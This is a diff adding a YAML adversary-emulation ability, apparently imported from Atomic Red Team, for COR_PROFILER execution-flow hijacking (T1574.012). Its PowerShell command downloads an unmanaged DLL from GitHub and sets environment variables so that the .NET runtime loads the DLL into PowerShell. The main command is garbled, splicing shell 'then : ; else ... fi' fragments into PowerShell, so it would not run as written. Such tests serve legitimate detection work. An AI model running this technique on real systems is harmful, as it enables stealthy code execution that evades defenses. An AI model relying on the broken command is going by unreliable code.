@@ -1,0 +1,62 @@
+- id: 79d57242-bbef-41db-b301-9d01d9f6e817
+  name: Registry-free process scope COR_PROFILER
+  description: 'Creates process scope environment variables to enable a .NET profiler
+    (COR_PROFILER) without making changes to the registry. The unmanaged profiler
+    DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.
+
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1574.012
+    name: 'Hijack Execution Flow: COR_PROFILER'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
+          -OutFile "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll"; fi; $env:COR_ENABLE_PROFILING
+          = 1; $env:COR_PROFILER = ''{09108e71-974c-4010-89cb-acf471ae9e2c}''; $env:COR_PROFILER_PATH
+          = ''"PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll"''; POWERSHELL -c
+          ''Start-Sleep 1'''
+        cleanup: $env:COR_ENABLE_PROFILING = 0; $env:COR_PROFILER = ''; $env:COR_PROFILER_PATH
+          = ''
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1574.012
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_name:
+        description: unamanged profiler DLL
+        type: path
+        default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
+      clsid_guid:
+        description: custom clsid guid
+        type: string
+        default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
+    dependencies:
+    - description: '"#{file_name}" must be present
+
+        '
+      prereq_command: 'if (Test-Path "#{file_name}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{file_name}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
+        -OutFile "#{file_name}"
+
+        '
+    technique_created: '2020-06-24T22:30:55.843Z'
+    atomic_guid: 79d57242-bbef-41db-b301-9d01d9f6e817
+    import_timestamp: '2025-06-24T11:15:01.537179Z'
